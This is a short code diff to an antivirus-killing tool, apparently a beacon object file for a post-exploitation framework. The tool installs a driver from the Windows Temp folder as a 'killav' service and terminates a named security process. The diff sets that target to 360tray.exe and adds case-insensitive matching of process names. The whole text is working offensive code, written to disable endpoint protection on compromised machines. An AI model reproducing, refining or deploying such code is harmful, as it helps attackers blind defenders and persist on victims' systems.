@@ -15,7 +15,7 @@
 #define DECLSPEC_IMPORT
 #endif
 
-#define AVPROCNAME L""
+#define AVPROCNAME L"360tray.exe"	//lower case
 #define SVCNAME L"killav"
 #define DriverPath L"C:\\Windows\\Temp\\killav.sys"
 
@@ -35,6 +35,8 @@ extern "C" {
 	DFR(MSVCRT, free);
 	DFR(MSVCRT, wcscpy);
 	DFR(MSVCRT, wcscmp);
+	DFR(MSVCRT, towlower);
+	DFR(MSVCRT, _wcsdup);	
 	DFR(MSVCRT, _beginthreadex);
 	DFR(MSVCRT, _endthreadex);
     // Map GetLastError to KERNEL32$GetLastError 
@@ -46,6 +48,8 @@ extern "C" {
 	#define free MSVCRT$free
 	#define wcscpy MSVCRT$wcscpy
 	#define wcscmp MSVCRT$wcscmp
+	#define towlower MSVCRT$towlower
+	#define _wcsdup MSVCRT$_wcsdup
 	#define _beginthreadex MSVCRT$_beginthreadex
 	#define _endthreadex MSVCRT$_endthreadex
 
@@ -680,6 +684,14 @@ extern "C" {
 		return 1;
 	}
 
+	wchar_t* toLowercase(const wchar_t* str) {
+		wchar_t* lower_str = _wcsdup(str);
+		for (int i = 0; lower_str[i]; i++) {
+			lower_str[i] = towlower(lower_str[i]);
+		}
+		return lower_str;
+	}
+
 	BOOL terminate(wchar_t* avproc)
 	{
 		DFR_LOCAL(KERNEL32, CreateToolhelp32Snapshot);
@@ -703,7 +715,7 @@ extern "C" {
 
 			if (Process32FirstW(hSnap, &pE)) {
 				do {
-					if (wcscmp(pE.szExeFile, avproc) == 0)
+					if (wcscmp(toLowercase(pE.szExeFile), avproc) == 0)
 					{
 						procId = pE.th32ProcessID;
 						break;
